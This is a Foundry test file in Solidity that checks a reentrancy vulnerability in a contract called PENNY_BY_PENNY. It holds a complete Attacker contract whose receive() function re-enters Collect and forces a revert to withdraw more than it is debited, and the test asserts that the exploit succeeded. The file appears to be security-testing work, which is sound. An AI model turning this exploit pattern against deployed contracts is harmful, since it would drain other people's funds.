
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY} from "../src/PENNY_BY_PENNY.sol";
import {LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {

    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1);
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal < address(this).balance / 2);
        

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = PENNY_BY_PENNY(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        uint256 initialAcc = victim.Acc(address(this)).balance;
        uint256 initialAttackerBal = address(this).balance;

        storedVal = val;

        victim.Collect(val);

        uint256 finalAcc = victim.Acc(address(this)).balance;
        uint256 finalAttackerBal = address(this).balance;

        uint256 deltaBal = finalAttackerBal - initialAttackerBal;
        uint256 deltaAcc = initialAcc - finalAcc;

        if (attackCallCount == 2 && deltaBal > deltaAcc) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedVal);
            revert("Force revert to make success=false");
        }
    }
}
